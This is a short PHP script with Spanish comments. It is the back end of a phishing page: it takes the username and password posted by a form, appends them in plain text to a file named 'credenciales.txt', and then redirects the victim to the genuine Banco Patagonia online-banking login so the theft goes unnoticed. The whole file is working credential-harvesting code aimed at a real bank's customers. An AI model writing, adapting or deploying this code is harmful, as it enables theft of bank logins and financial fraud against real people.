<?php
// Obtener los datos del formulario
$usuario = $_POST['username'];
$password = $_POST['password'];

// Almacenar las credenciales en un archivo
$file = 'credenciales.txt';
$handle = fopen($file, 'a');
fwrite($handle, "Usuario: $usuario, Contraseña: $password\n");
fclose($handle);

// Redirigir al usuario a la página de login del Banco Patagonia
header("Location: https://ebankpersonas.bancopatagonia.com.ar/eBanking/usuarios/login.htm");
exit;
?>